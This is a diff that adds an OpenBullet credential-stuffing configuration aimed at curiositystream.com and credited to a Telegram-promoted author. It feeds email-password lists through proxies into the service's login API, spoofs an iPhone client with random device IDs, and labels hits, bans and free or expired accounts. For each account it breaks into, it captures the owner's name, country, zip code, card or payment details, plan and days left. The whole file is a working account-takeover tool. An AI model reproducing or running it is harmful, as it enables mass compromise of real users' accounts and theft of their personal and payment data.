@@ -1,0 +1,129 @@
+[SETTINGS]
+{
+  "Name": "curiositystream.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-09-28T00:41:55.5544728+03:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor | Telegram Channel: @Open_Bullet_Config",
+      "VariableName": "",
+      "Id": 575641598
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var id = uuidv4();
+END SCRIPT -> VARS "id"
+
+#Deviceid FUNCTION ToUppercase "<id>" -> VAR "Deviceid" 
+
+#Login REQUEST POST "https://api.curiositystream.com/v1/login" EncodeContent=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.curiositystream.com" 
+  HEADER "X-Language: en" 
+  HEADER "Accept: */*" 
+  HEADER "X-Client-Version: 2.9.4" 
+  HEADER "X-4k-Capable: true" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US;q=1" 
+  HEADER "X-Deviceid: <Deviceid>" 
+  HEADER "User-Agent: CuriosityStream/2.9.4 (iPhone; iOS 15.0; Scale/3.00)" 
+  HEADER "X-Platform: ios" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "429" 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"success" 
+
+#key FUNCTION Constant "subscription_renewed_at\":\"" -> VAR "key" 
+
+IF "<SOURCE>" DoesNotContain "<key>"
+SET STATUS CUSTOM "FREE"
+ENDIF
+
+#firstName PARSE "<SOURCE>" LR "first_name\":\"" "\"" CreateEmpty=FALSE -> CAP "firstName" 
+
+#lastName PARSE "<SOURCE>" LR "last_name\":\"" "\"" CreateEmpty=FALSE -> CAP "lastName" 
+
+#ex PARSE "<SOURCE>" LR "subscription_renewing_at\":\"" "\"" -> VAR "ex" 
+
+#unix FUNCTION DateToUnixTime "yyyy-MM-dd HH:mm:ss" "<ex>" -> VAR "unix" 
+
+FUNCTION RegexMatch "([0-9]{4}-[0-9]{2}-[0-9]{2})" "<ex>" -> CAP "expireDate" 
+
+#current FUNCTION CurrentUnixTime -> VAR "current" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<current>" GreaterThan "<unix>" 
+
+#compute FUNCTION Compute "(<unix>-<current>)/86400" -> VAR "compute" 
+
+#daysLeft FUNCTION Round "<compute>" -> CAP "daysLeft" 
+
+#country PARSE "<SOURCE>" LR "country\":\"" "\"" CreateEmpty=FALSE -> CAP "country" 
+
+#zipCode PARSE "<SOURCE>" LR "zip_code\":\"" "\"" CreateEmpty=FALSE -> CAP "zipCode" 
+
+#cardNumber PARSE "<SOURCE>" LR "current_payment_information\":\"" "\"" CreateEmpty=FALSE -> CAP "cardNumber" 
+
+#plan PARSE "<SOURCE>" LR "plan\":{\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "plan" 
+
+SET CAP "Config By" "@Hogo_Victor"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletChannel"
+
